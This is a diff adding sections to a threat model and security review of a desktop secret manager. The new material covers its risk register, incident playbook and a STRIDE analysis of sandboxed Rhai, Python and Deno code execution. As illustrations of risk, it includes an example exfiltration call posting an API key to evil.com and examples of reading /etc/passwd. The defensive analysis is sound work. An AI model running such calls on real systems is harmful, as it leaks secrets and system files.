@@ -678,4 +678,371 @@ Source: [`package.json`](../package.json)
 | 1 | Local admin reads api.token file | Medium | Low | icacls restricts to current user | Yes | Admin/SYSTEM can bypass any user-level ACL; inherent OS limitation |
 | 2 | Malware reads process memory while unlocked | High | Low | Master key zeroized on lock; secret values zeroized after use; auto-lock timer defaults to 15 min | Yes | Sophisticated malware can dump memory; auto-lock reduces window |
 | 3 | Weak master password chosen by user | High | Medium | No complexity enforcement currently | Accepted with recommendation | Add password strength meter |
-| 4 | Weak vault PIN enables brute force of .tmvault | Medium | Medium | Minimum 6 characters enforced in [`validate_pin`](../src-
+| 4 | Weak vault PIN enables brute force of .tmvault | Medium | Medium | Minimum 6 characters enforced in [`validate_pin`](../src-tauri/src/commands.rs:112); Argon2id KDF slows brute-force | Accepted with recommendation | Recommend minimum 8 chars + complexity rules |
+| 5 | Self-reported script_id enables impersonation | Medium | Low | Bearer token is primary auth; impersonation requires token compromise first | Accepted | Trust-on-first-use model; no client authentication beyond token |
+| 6 | SQLite metadata (secret names, scripts, audit) readable without master password | Medium | Low | DB file permissions hardened via icacls | Accepted | Encrypting metadata would prevent search/list without decryption |
+| 7 | Expired token on disk could be recovered from file system journal | Low | Low | Token file overwritten on rotation; icacls restricts access | Accepted | Full-disk encryption recommended for high-security environments |
+| 8 | **[NEW]** Persistent token increases compromise window | Medium | Low | Manual rotation available; per-script + per-secret checks still enforced | Accepted with recommendation | See Section 1.1 -- recommend auto-rotation schedule |
+| 9 | **[NEW]** Port squatting on 17179 could intercept tokens from hardcoded scripts | Medium | Very Low | Fallback to random port; `api.port` file reflects actual port | Accepted with recommendation | See Section 1.2 -- recommend scripts read api.port file |
+| 10 | **[NEW]** One-click toast approval could lead to accidental secret exposure | Medium | Low | Toast requires deliberate click; approval is revocable | Accepted with recommendation | See Section 1.4 -- recommend approval cooldown |
+
+---
+
+## 8. Incident Response Playbook
+
+### 8.1 Bearer Token Compromise
+
+1. **Detect**: Unexpected entries in audit log (`secret_accessed_via_api` from unknown `script_id`)
+2. **Contain**: Immediately rotate the token via Settings > Rotate API Token (calls [`rotate_api_token`](../src-tauri/src/commands.rs:1319))
+3. **Assess**: Review audit log for all `secret_accessed_via_api` events during the compromise window
+4. **Remediate**: Revoke suspicious script registrations; rotate any secrets that were accessed
+5. **Prevent**: Verify `api.token` file permissions; enable auto-rotation schedule
+
+### 8.2 Vault File (.tmvault) Leaked
+
+1. **Detect**: External report or discovery of vault file in unintended location
+2. **Contain**: Cannot revoke a file -- the PIN is the only protection
+3. **Assess**: Determine which secrets were in the vault (check audit log for `vault_exported` events)
+4. **Remediate**: Rotate all secrets that were included in the leaked vault
+5. **Prevent**: Use strong PINs; set expiration dates on sensitive vaults; delete vault files after import
+
+### 8.3 Dependency Vulnerability Discovered
+
+1. **Detect**: `cargo audit` or `npm audit` flags a CVE
+2. **Assess**: Determine if the vulnerable code path is reachable in this application
+3. **Remediate**: Update the dependency; test; redeploy
+4. **Prevent**: Regular dependency audits; consider automated CI checks
+
+---
+
+## 9. Recommendations for Future Improvement
+
+| # | Recommendation | Category | Priority | Status |
+|---|---------------|----------|----------|--------|
+| 1 | Add password strength meter to master password setup | UX/Security | Medium | Planned |
+| 2 | Enforce minimum PIN complexity (digits + letters) | Crypto | Medium | Planned |
+| 3 | Add optional auto-rotation schedule for bearer token | API Security | Medium | Planned |
+| 4 | Display token age in Settings UI | UX | Low | Planned |
+| 5 | Add approval cooldown (2-3s delay) on toast Approve button | UX/Security | Medium | Planned |
+| 6 | Add configurable "confirm before approve" dialog | UX/Security | Medium | Planned |
+| 7 | Maximum concurrent toast limit (collapse to summary) | UX | Medium | Planned |
+| 8 | Use `OnceLock<AppHandle>` instead of `Mutex<Option<AppHandle>>` | Performance | Low | Planned |
+| 9 | Document port-squatting risk in user-facing docs | Documentation | Medium | Planned |
+| 10 | Emit warning event when fallback port is used | API Security | Medium | Planned |
+| 11 | Server identity verification on health endpoint | API Security | Low | Planned |
+
+---
+
+## 10. Overall Security Posture Assessment
+
+**Rating: GOOD -- suitable for its intended use case**
+
+The TamperMonkey Secret Manager provides a meaningful security improvement over the common practice of hardcoding API keys and credentials directly in TamperMonkey scripts. The application's security model is appropriate for a single-user desktop application managing moderate-sensitivity credentials.
+
+**Strengths:**
+- Industry-standard cryptographic primitives (AES-256-GCM, Argon2id)
+- Defence-in-depth with two-layer authorization (token + per-script/per-secret approval)
+- Comprehensive audit logging
+- Secure memory handling with zeroization
+- Blind mode enforcement at the Rust backend level (not bypassable from frontend)
+- Well-structured code with clear separation of concerns
+
+**Areas for improvement:**
+- Password/PIN complexity enforcement
+- Token lifecycle management (auto-rotation, age display)
+- Toast approval UX hardening (cooldown, confirmation dialog)
+- Formal adversarial testing (token replay, PIN brute force, script spoofing)
+- Regular dependency auditing pipeline
+
+**Trust model**: The application operates within a local trust boundary. It assumes the current OS user account is trusted and that the physical machine is not compromised. This is appropriate for a desktop credential manager but means it is not suitable for multi-user or server-deployed scenarios.
+
+---
+
+## 11. Blind Code Modules -- Security Assessment (Phase 8)
+
+**Date**: 2026-03-20
+**Scope**: Full security review of the Blind Code Modules feature including Rhai execution engine, Python subprocess executor, Deno (JS/TS) subprocess executor, .tmcode file format, API endpoint, IPC commands, and frontend components.
+
+### 11.1 Feature Overview
+
+Blind Code Modules address the fundamental weakness in the blind secret model: once a TamperMonkey script is approved to access a blind secret, it receives the raw plaintext value and could exfiltrate it. Blind Code Modules keep secrets server-side by executing encrypted code within TMSM that uses secrets internally and returns only computed results.
+
+Supported languages:
+- **Rhai**: Embedded scripting engine running in-process via [`executor.rs`](../src-tauri/src/secrets/executor.rs)
+- **Python**: Subprocess with restricted environment via [`subprocess_executor.rs`](../src-tauri/src/secrets/subprocess_executor.rs:18)
+- **JavaScript/TypeScript**: Subprocess via Deno runtime with permission flags via [`subprocess_executor.rs`](../src-tauri/src/secrets/subprocess_executor.rs:116)
+
+Execution dispatch: [`dispatch_execute()`](../src-tauri/src/secrets/executor.rs:314) routes by language string to the appropriate engine.
+
+```mermaid
+graph TB
+    A[TamperMonkey Script] -->|POST /api/execute/:module_name| B[execute_code_api handler]
+    B --> C{Three-layer auth}
+    C -->|1. Bearer token| D[verify_bearer]
+    C -->|2. Script approved?| E[check script registration]
+    C -->|3. Per-module access?| F[check_script_code_access]
+    F --> G[Decrypt module code with master key]
+    G --> H[Resolve required secrets]
+    H --> I{Language?}
+    I -->|rhai| J[In-process Rhai engine]
+    I -->|python| K[Python subprocess]
+    I -->|javascript/typescript| L[Deno subprocess]
+    J --> M[Return output only]
+    K --> M
+    L --> M
+    M --> N[Audit log: code_module_executed]
+    N --> O[HTTP 200 + JSON result]
+```
+
+### 11.2 STRIDE Analysis -- Blind Code Execution
+
+| STRIDE Category | Threat | Current Mitigation | Status | Notes |
+|---|---|---|---|---|
+| **S**poofing | Malicious script impersonates approved script to execute code | Three-layer auth: bearer token + script approval + per-module access in [`execute_code_api`](../src-tauri/src/api/routes.rs:391) | Mitigated | Same trust model as secret access; script_id is self-reported but requires token |
+| **T**ampering | Attacker modifies encrypted code in database to alter execution | AES-256-GCM authenticated encryption; any tampering causes decryption failure | Mitigated | Code is encrypted with master key before DB storage |
+| **T**ampering | Attacker modifies parameters sent to module | [`validate_params()`](../src-tauri/src/secrets/executor.rs:239) rejects any parameter not in `allowed_params` list | Mitigated | Allowlist enforced before execution |
+| **R**epudiation | Script denies executing a module | Audit log records `code_module_executed` with `script_id` and `module_name` in [`execute_code_api`](../src-tauri/src/api/routes.rs:549) | Mitigated | Script ID is self-reported but logged consistently |
+| **I**nformation Disclosure | Secret values leak through execution output | Secrets are injected into scope as variables; output is whatever the script returns -- **secrets could appear in output if the code author includes them** | Partially Mitigated | By design, the code author controls output; the security boundary is at the approval level |
+| **I**nformation Disclosure | Blind module code leaked to frontend | [`get_blind_code_module_code`](../src-tauri/src/commands.rs:1824) returns `None` for blind modules; [`list_blind_code_modules`](../src-tauri/src/commands.rs:1418) never includes code | Mitigated | See Section 11.8 for full audit |
+| **D**enial of Service | Infinite loop or resource exhaustion in Rhai script | [`set_max_operations(100_000)`](../src-tauri/src/secrets/executor.rs:74) caps computation; [`set_max_string_size(1MB)`](../src-tauri/src/secrets/executor.rs:75) caps memory | Mitigated | Rhai engine enforces resource limits |
+| **D**enial of Service | Subprocess hangs indefinitely (Python/Deno) | `wait_with_output()` blocks indefinitely -- **no timeout enforcement** | **Residual** | See Risk R-11.1 below |
+| **D**enial of Service | Module expiration bypassed | Expiration checked before execution in [`execute_code_api`](../src-tauri/src/api/routes.rs:463); returns HTTP 410 Gone if expired | Mitigated | Timestamp is inside encrypted payload, tamper-resistant |
+| **E**levation of Privilege | Unapproved script executes code module | Three-layer check: script registration + script approval + per-module access in [`execute_code_api`](../src-tauri/src/api/routes.rs:425) | Mitigated | Unapproved access auto-creates request record and emits toast |
+| **E**levation of Privilege | Code module accesses secrets beyond its `required_secrets` list | [`resolve_secrets()`](../src-tauri/src/secrets/executor.rs:199) only decrypts secrets listed in `required_secrets`; the Rhai `secrets` map contains only those values | Mitigated | No `secret()` function registered -- only pre-resolved values in scope |
+
+### 11.3 Rhai Engine Security
+
+The Rhai execution engine is configured in [`build_engine()`](../src-tauri/src/secrets/executor.rs:69) with the following security controls:
+
+| Control | Setting | Purpose |
+|---------|---------|---------|
+| Max expression depth | 64 / 32 (global / function) | Prevents stack overflow via deeply nested expressions |
+| Max operations | 100,000 | Prevents infinite loops and excessive computation |
+| Max string size | 1 MB | Prevents memory exhaustion via string concatenation |
+| Max array size | 10,000 | Prevents memory exhaustion via large arrays |
+| Max map size | 10,000 | Prevents memory exhaustion via large maps |
+| File system access | None | Rhai engine has no `import` capability or FS functions registered |
+| Process management | None | No `system()` or process-spawning functions registered |
+| Module imports | None | No module resolver configured |
+| HTTP access | `http_get()`, `http_post()` | Registered with 30-second timeout via [`reqwest::blocking::Client`](../src-tauri/src/secrets/executor.rs:81) |
+
+**Registered custom functions:**
+
+| Function | Signature | Risk Assessment |
+|----------|-----------|-----------------|
+| [`http_get`](../src-tauri/src/secrets/executor.rs:80) | `http_get(url: String, headers: Map) -> String` | **Medium** -- enables network access for API calls, but also enables data exfiltration |
+| [`http_get`](../src-tauri/src/secrets/executor.rs:113) | `http_get(url: String) -> String` | Same as above, convenience overload |
+| [`http_post`](../src-tauri/src/secrets/executor.rs:137) | `http_post(url: String, headers: Map, body: String) -> String` | **Medium** -- same exfiltration risk; body could contain secrets |
+| [`http_post`](../src-tauri/src/secrets/executor.rs:169) | `http_post(url: String, body: String) -> String` | Same as above, convenience overload |
+
+**Secret injection mechanism**: Secrets are injected as a `secrets` map in the Rhai [`Scope`](../src-tauri/src/secrets/executor.rs:278) via `scope.push("secrets", secrets_map)`. After execution, all secret values are zeroized in [`execute_module()`](../src-tauri/src/secrets/executor.rs:304).
+
+**Finding**: The Rhai scope cloning behaviour means secret values exist in both the `ExecutionContext.secrets` HashMap (zeroized after execution) and the Rhai `Scope` (which is dropped but not explicitly zeroized). The Rhai `Dynamic` values holding secrets will be deallocated by Rust's allocator but not overwritten with zeros. This is a minor residual memory risk consistent with the existing process memory risk (Risk #2 in Section 7).
+
+### 11.4 Python Subprocess Security
+
+The Python executor in [`execute_python()`](../src-tauri/src/secrets/subprocess_executor.rs:18) applies the following sandbox:
+
+| Control | Implementation | Effectiveness |
+|---------|---------------|---------------|
+| Environment clearing | [`env_clear()`](../src-tauri/src/secrets/subprocess_executor.rs:52) | High -- removes all inherited env vars |
+| Selective env restoration | `PATH`, `SYSTEMROOT`, `TEMP`, `TMP`, `PYTHONDONTWRITEBYTECODE`, `PYTHONUNBUFFERED` | Necessary for Python to function and perform network I/O |
+| Secret delivery | stdin as JSON via [`write_all(input_json)`](../src-tauri/src/secrets/subprocess_executor.rs:74) | High -- secrets never appear in command-line args (not visible in process listing) |
+| Code delivery | `-c` flag with inline code via [`args(["-c", &wrapper_script])`](../src-tauri/src/secrets/subprocess_executor.rs:47) | Medium -- code is visible in process listing via `/proc/PID/cmdline` on Linux; less of a concern on Windows |
+| Network access | Allowed by default (no restriction) | By design -- needed for API calls |
+| Filesystem access | **Not restricted** | **Residual risk** -- Python can `import os`, `open()` files, etc. |
+| Post-execution zeroization | Secrets zeroized in Rust after `wait_with_output()` at [line 91](../src-tauri/src/secrets/subprocess_executor.rs:91) | Partial -- Python process memory is not zeroized; only the Rust-side HashMap copies |
+| Timeout | **None** -- `wait_with_output()` blocks indefinitely at [line 79](../src-tauri/src/secrets/subprocess_executor.rs:79) | **Missing** |
+
+**Specific risks:**
+
+1. **Filesystem access**: Python's standard library provides unrestricted filesystem access. A module could `import os; os.listdir('/')` or `open('/etc/passwd').read()`. The `env_clear()` does not prevent this.
+   - **Severity**: Medium
+   - **Mitigation**: Code is encrypted and must be approved before execution. The code author and approver are trusted parties. On Windows, the Python process runs as the current user and cannot access files outside its permission scope.
+   - **Recommendation**: Consider using `RestrictedPython` or running in a container for higher-security deployments.
+
+2. **Process spawning**: Python can `import subprocess; subprocess.run(...)` to execute arbitrary commands on the host.
+   - **Severity**: Medium
+   - **Mitigation**: Same as filesystem -- relies on code trust model. The `env_clear()` means spawned processes inherit a minimal environment.
+   - **Recommendation**: Consider a Python security policy or audit wrapper.
+
+3. **Secret leakage in command line**: The wrapper script is passed via `-c`, making it visible in process listings. However, secrets are passed via stdin, not command-line arguments, which is correct.
+   - **Severity**: Low
+   - **Mitigation**: stdin-based injection is the recommended pattern.
+
+### 11.5 Deno Subprocess Security
+
+The Deno executor in [`execute_deno()`](../src-tauri/src/secrets/subprocess_executor.rs:116) applies the following sandbox:
+
+| Control | Implementation | Effectiveness |
+|---------|---------------|---------------|
+| Permission model | [`--allow-net`](../src-tauri/src/secrets/subprocess_executor.rs:157) only | **Strong** -- Deno denies all other permissions by default |
+| No filesystem read | `--allow-read` NOT passed | High -- `Deno.readFile()` and similar will throw `PermissionDenied` |
+| No filesystem write | `--allow-write` NOT passed | High -- `Deno.writeFile()` will throw `PermissionDenied` |
+| No env access | `--allow-env` NOT passed | High -- `Deno.env.get()` will throw `PermissionDenied` |
+| No subprocess | `--allow-run` NOT passed | High -- `Deno.Command()` will throw `PermissionDenied` |
+| No prompt | [`--no-prompt`](../src-tauri/src/secrets/subprocess_executor.rs:158) | High -- prevents Deno from prompting for permissions at runtime |
+| Secret delivery | stdin as JSON via [`write_all(input_json)`](../src-tauri/src/secrets/subprocess_executor.rs:174) | High -- secrets not in args or env |
+| Code delivery | Temp file at [`tmsm_exec_{pid}.{ext}`](../src-tauri/src/secrets/subprocess_executor.rs:148) | Medium -- see temp file risk below |
+| Temp file cleanup | [`remove_file(&temp_file)`](../src-tauri/src/secrets/subprocess_executor.rs:190) after execution | Good -- cleanup on both success and error paths |
+| Post-execution zeroization | Secrets zeroized in Rust at [line 195](../src-tauri/src/secrets/subprocess_executor.rs:195) | Same as Python |
+| Timeout | **None** -- `wait_with_output()` blocks indefinitely at [line 178](../src-tauri/src/secrets/subprocess_executor.rs:178) | **Missing** |
+
+**Specific risks:**
+
+1. **Temp file race condition**: The script is written to `{TEMP}/tmsm_exec_{pid}.ts` at [line 149](../src-tauri/src/secrets/subprocess_executor.rs:149), then Deno reads it. Between write and read, another process could potentially read the file contents (the code, not secrets -- secrets are passed via stdin).
+   - **Severity**: Low -- the temp file contains module code (which is encrypted in the DB), not secrets. However, for blind modules, this briefly exposes the code on disk.
+   - **Likelihood**: Very Low -- requires precise timing and knowledge of the temp file path.
+   - **Mitigation**: File is deleted immediately after execution. The PID in the filename adds minimal unpredictability.
+   - **Recommendation**: Use a randomly named file via `tempfile` crate for stronger unpredictability. Consider setting restrictive file permissions on the temp file.
+
+2. **Deno's --allow-net scope**: `--allow-net` without a host specifier allows connections to **any** network host. This means a module could exfiltrate secrets to an arbitrary URL.
+   - **Severity**: Medium -- inherent to the feature design
+   - **Mitigation**: Same as Rhai HTTP functions -- the security boundary is at the code approval level
+   - **Recommendation**: Future enhancement: allow module authors to declare allowed network hosts, and pass `--allow-net=host1,host2` to Deno
+
+3. **Deno version compatibility**: The wrapper uses `Deno.stdin.readable` which requires Deno 1.16+. Older versions would fail silently.
+   - **Severity**: Low -- operational, not security
+   - **Mitigation**: Error message includes "is Deno installed?" hint
+
+### 11.6 .tmcode File Format Security
+
+The `.tmcode` format defined in [`blind_code.rs`](../src-tauri/src/secrets/blind_code.rs) mirrors the `.tmvault` format:
+
+| Property | Value | Security Implication |
+|----------|-------|---------------------|
+| Magic bytes | `TMCD` (0x544D4344) at [line 8](../src-tauri/src/secrets/blind_code.rs:8) | Validates file type; prevents accidental import of wrong file |
+| Version | `0x01` at [line 11](../src-tauri/src/secrets/blind_code.rs:11) | Enables format evolution |
+| Salt | 16 bytes (random) at [line 70](../src-tauri/src/secrets/blind_code.rs:70) | Per-file salt for key derivation |
+| Module count | u32 LE at [line 98](../src-tauri/src/secrets/blind_code.rs:98) | Cross-validated against payload at [line 169](../src-tauri/src/secrets/blind_code.rs:169) |
+| Encryption | AES-256-GCM with Argon2id-derived key at [line 85](../src-tauri/src/secrets/blind_code.rs:85) | Same strength as .tmvault |
+| PIN requirement | Minimum 6 characters at [line 17](../src-tauri/src/secrets/blind_code.rs:17) | Same policy as vault PINs |
+| Expiration | Optional ISO 8601 timestamp at [line 42](../src-tauri/src/secrets/blind_code.rs:42); checked on import at [line 181](../src-tauri/src/secrets/blind_code.rs:181) | Inside encrypted payload -- tamper-resistant |
+| Language field | Stored in `CodeModuleEntry` at [line 27](../src-tauri/src/secrets/blind_code.rs:27) | Determines execution engine on import |
+| Plaintext zeroization | JSON bytes zeroized after encryption at [line 89](../src-tauri/src/secrets/blind_code.rs:89); decrypted bytes zeroized after deserialization at [line 178](../src-tauri/src/secrets/blind_code.rs:178) | Minimizes plaintext lifetime |
+
+**Validation on import** (in [`import_code()`](../src-tauri/src/secrets/blind_code.rs:107)):
+
+| Check | Line | Result on Failure |
+|-------|------|-------------------|
+| Minimum file size (25 bytes) | [118](../src-tauri/src/secrets/blind_code.rs:118) | `CryptoError::InvalidData` |
+| Magic bytes `TMCD` | [127](../src-tauri/src/secrets/blind_code.rs:127) | `CryptoError::InvalidData` |
+| Version == 0x01 | [135](../src-tauri/src/secrets/blind_code.rs:135) | `CryptoError::InvalidData` |
+| Non-empty encrypted payload | [151](../src-tauri/src/secrets/blind_code.rs:151) | `CryptoError::InvalidData` |
+| PIN derivation succeeds | [158](../src-tauri/src/secrets/blind_code.rs:158) | KDF error |
+| AES-GCM decryption succeeds | [162](../src-tauri/src/secrets/blind_code.rs:162) | `DecryptionFailed` (wrong PIN or tampered) |
+| JSON deserialization succeeds | [165](../src-tauri/src/secrets/blind_code.rs:165) | `DecryptionFailed` |
+| Module count matches | [169](../src-tauri/src/secrets/blind_code.rs:169) | `CryptoError::InvalidData` |
+| Expiration not passed | [182](../src-tauri/src/secrets/blind_code.rs:182) | `CryptoError::InvalidData` |
+
+**Assessment**: The .tmcode format inherits the same security properties as .tmvault. The additional `language` field introduces a new attack surface: a malicious .tmcode file could specify an unexpected language to route execution to a different engine. However, [`dispatch_execute()`](../src-tauri/src/secrets/executor.rs:314) only accepts `"rhai"`, `"python"`, `"javascript"`, and `"typescript"` -- any other value returns `ExecutionError::RuntimeError`.
+
+### 11.7 API Endpoint Security (POST /api/execute/:module_name)
+
+The [`execute_code_api`](../src-tauri/src/api/routes.rs:391) handler implements three-layer authorization:
+
+| Layer | Check | Code Location | Failure Response |
+|-------|-------|---------------|------------------|
+| 1. Bearer token | `verify_bearer(&headers, &token_guard)` | [Line 399](../src-tauri/src/api/routes.rs:399) | 401 Unauthorized |
+| 2. App unlocked | `is_unlocked` mutex check | [Line 412](../src-tauri/src/api/routes.rs:412) | 423 Locked |
+| 3a. Script registered + approved | `get_script()` + `script.approved` | [Line 425](../src-tauri/src/api/routes.rs:425) | 403 Forbidden |
+| 3b. Module exists + approved | `get_blind_code_module()` + `module.approved` | [Line 452](../src-tauri/src/api/routes.rs:452) | 404 / 403 |
+| 3c. Module not expired | Expiration check on `module.expires_at` | [Line 463](../src-tauri/src/api/routes.rs:463) | 410 Gone |
+| 3d. Per-script module access | `check_script_code_access()` | [Line 473](../src-tauri/src/api/routes.rs:473) | 403 Forbidden |
+
+**Response security:**
+
+- Security headers applied: `Cache-Control: no-store`, `Pragma: no-cache`, `X-Content-Type-Options: nosniff` at [line 554](../src-tauri/src/api/routes.rs:554)
+- Response body contains only the execution result (JSON `{"result": "..."}`) at [line 559](../src-tauri/src/api/routes.rs:559) -- no secret values, no module code, no metadata
+- Audit event logged: `code_module_executed` at [line 549](../src-tauri/src/api/routes.rs:549)
+
+**Tauri events emitted for unapproved access:**
+
+| Event | Trigger | Payload | Risk |
+|-------|---------|---------|------|
+| `script-pending-approval` | Unknown script auto-registers | `{ script_id, script_name, domain }` | None -- no secret/code info |
+| `code-execution-requested` | Script lacks per-module access | `{ script_id, script_name, module_name }` | None -- module name only, no code |
+
+**Assessment**: The endpoint follows the same defence-in-depth pattern as [`get_secret_api`](../src-tauri/src/api/routes.rs:137). No secret values or module code are present in error responses, event payloads, or audit entries.
+
+### 11.8 Blind Mode Enforcement Audit
+
+| Code Path | Exposes Code? | Evidence |
+|-----------|--------------|----------|
+| [`list_blind_code_modules`](../src-tauri/src/commands.rs:1418) | **No** | Constructs `BlindCodeModuleMetadata` which has no `code` or `encrypted_code` field; maps only metadata fields (name, description, language, secrets list, params list, approval status, timestamps) |
+| [`get_blind_code_module_code`](../src-tauri/src/commands.rs:1824) | **No** (for blind) | Line 1849: `if module.blind { return Ok(None); }` -- blind modules return `None`; only non-blind (locally-created) modules return decrypted code |
+| [`import_blind_code_file`](../src-tauri/src/commands.rs:1458) | **No** | After decryption, code is immediately re-encrypted with master key at [line 1498](../src-tauri/src/commands.rs:1498); plaintext code is zeroized at [line 1503](../src-tauri/src/commands.rs:1503); `ImportedCodeModuleInfo` return type has no code field |
+| [`export_blind_code_file`](../src-tauri/src/commands.rs:1552) | **Acceptable** | Decrypts code for re-encryption into .tmcode file; code flows to encrypted file, never to frontend |
+| [`create_blind_code_module`](../src-tauri/src/commands.rs:1636) | **N/A** | Write-only -- code is encrypted before storage; created with `blind: false` (author's own code) |
+| [`execute_code_api`](../src-tauri/src/api/routes.rs:391) | **No** | Code is decrypted server-side for execution at [line 509](../src-tauri/src/api/routes.rs:509); only the return value is sent in the response at [line 559](../src-tauri/src/api/routes.rs:559) |
+| [`BlindCodeModuleMetadata`](../src-tauri/src/commands.rs:1381) | **No** | Struct definition: `id, name, description, language, required_secrets, allowed_params, approved, blind, created_at, updated_at, expires_at` -- no `code` field |
+| Audit log events | **No** | Events log `module_name` only (e.g., `blind_code_imported`, `code_module_executed`); no code content |
+| Tauri events | **No** | `CodeExecutionRequestEvent` at [line 368](../src-tauri/src/api/routes.rs:368): `script_id, script_name, module_name` -- no code |
+
+**Conclusion**: Blind code modules follow the same enforcement pattern as blind secrets. Code is never sent to the frontend for blind modules. The security boundary is at the Rust backend level -- the frontend cannot request blind code through any IPC command.
+
+### 11.9 Identified Risks and Recommendations
+
+| # | Risk | Severity | Likelihood | Current Mitigation | Recommendation | Priority |
+|---|------|----------|------------|-------------------|----------------|----------|
+| R-11.1 | **Subprocess timeout missing**: [`wait_with_output()`](../src-tauri/src/secrets/subprocess_executor.rs:79) blocks indefinitely for both Python and Deno. A malicious or buggy module could hang the execution thread permanently. | High | Medium | None | Add timeout using `tokio::time::timeout()` or spawn a watchdog thread that calls `child.kill()` after 30 seconds. | **High** |
+| R-11.2 | **Secret exfiltration via network**: All three languages (Rhai `http_post`, Python `requests`, Deno `fetch`) allow sending secrets to arbitrary URLs. A malicious code module could `http_post("https://evil.com", secrets["API_KEY"])`. | Medium | Low | Code is encrypted and must be approved by the user before execution. The code author and approver are trusted parties. | Consider per-module URL allowlists: module declares allowed domains, execution engine enforces them. Future enhancement. | Medium |
+| R-11.3 | **Python filesystem access unrestricted**: Python can `import os`, `open()`, `subprocess.run()` despite `env_clear()`. | Medium | Low | Trust model: code author is trusted; module must be approved before execution. | Consider `RestrictedPython`, `nsjail`, or a container for higher-security deployments. Document the limitation. | Medium |
+| R-11.4 | **Deno temp file briefly exposes code on disk**: Script written to `{TEMP}/tmsm_exec_{pid}.{ext}` exists as a readable file between write and Deno startup. | Low | Very Low | File deleted immediately after execution on both success and error paths. | Use `tempfile` crate for random filenames; set restrictive permissions on the temp file. | Low |
+| R-11.5 | **Rhai secret values not explicitly zeroized in Scope**: The Rhai `Dynamic` values cloned into the engine's `Scope` are dropped but not zeroized. Only the `ExecutionContext.secrets` HashMap is zeroized. | Low | Very Low | Rhai Scope is dropped when execution completes; memory is freed by allocator. Consistent with existing process memory risk (Risk #2). | Accept -- explicit zeroization of Rhai internals would require forking the crate. | Low |
+| R-11.6 | **Python stdin JSON contains cloned secrets**: `secrets.clone()` at [line 40](../src-tauri/src/secrets/subprocess_executor.rs:40) creates a copy of the secrets for JSON serialization. The `input_json` string is not explicitly zeroized after writing to stdin. | Low | Very Low | The Rust-side HashMap is zeroized after execution. The `input_json` String is dropped but not zeroized. | Add `input_json.zeroize()` after `write_all()` completes. | Low |
+| R-11.7 | **Code visible in Python process args**: The wrapper script is passed via `-c` flag, making module code visible in process listings (e.g., `ps aux`). Secrets are correctly passed via stdin. | Low | Very Low | Code is not secret-equivalent; secrets are in stdin, not args. On Windows, process args are less exposed than on Linux. | Consider writing Python code to a temp file (like Deno) to avoid process listing exposure. | Low |
+| R-11.8 | **Toast approval for code execution**: Same one-click risk as secret access toasts (Section 1.4). A user could accidentally approve a code module execution request. | Medium | Low | Same mitigations as Section 1.4: deliberate click required, revocable. | Apply same recommendations as Section 1.4: approval cooldown, optional confirmation dialog. | Medium |
+
+### 11.10 Summary of Code Execution Security Model
+
+```mermaid
+graph TB
+    subgraph "Trust Boundary: Code Authorship"
+        A[Code Author writes module] --> B[Encrypts as .tmcode with PIN]
+    end
+
+    subgraph "Trust Boundary: Code Approval"
+        B --> C[User B imports .tmcode with PIN]
+        C --> D[User B approves module for execution]
+        D --> E[User B approves per-script access]
+    end
+
+    subgraph "Trust Boundary: Runtime Execution"
+        E --> F{Language}
+        F -->|Rhai| G["Sandboxed engine
+        - 100K ops limit
+        - No FS/process
+        - HTTP with 30s timeout"]
+        F -->|Python| H["Subprocess
+        - env_clear()
+        - Secrets via stdin
+        - FS access NOT restricted"]
+        F -->|Deno| I["Subprocess
+        - --allow-net only
+        - No FS/env/run
+        - Code in temp file"]
+    end
+
+    G --> J[Output returned to TM script]
+    H --> J
+    I --> J
+
+    style G fill:#2d5a27,color:#fff
+    style H fill:#8a6914,color:#fff
+    style I fill:#2d5a27,color:#fff
+```
+
+**Sandbox strength comparison:**
+
+| Capability | Rhai | Python | Deno |
+|-----------|------|--------|------|
+| Network access | `http_get`, `http_post` (30s timeout) | Unrestricted | `--allow-net` (unrestricted hosts) |
+| Filesystem read | Blocked (no FS functions) | **Allowed** | Blocked (`--allow-read` not passed) |
+| Filesystem write | Blocked | **Allowed** | Blocked (`--allow-write` not passed) |
+| Process spawning | Blocked | **Allowed** (`import subprocess`) | Blocked (`--allow-run` not passed) |
+| Environment variables | Blocked | Cleared (`env_clear()`) but `os.environ` accessible | Blocked (`--allow-env` not passed) |
+| Resource limits | 100K ops, 1MB strings, 10K arrays/maps | None (OS limits only) | None (OS limits only) |
+| Execution timeout | Implicit (ops limit) | **None** | **None** |
+
+**Overall assessment**: The Rhai engine provides the strongest sandbox. Deno provides strong OS-level sandboxing via its permission model. Python is the weakest sandbox, relying primarily on the trust model (code approval) rather than technical enforcement. This difference should be documented for users choosing which language to use for their modules.
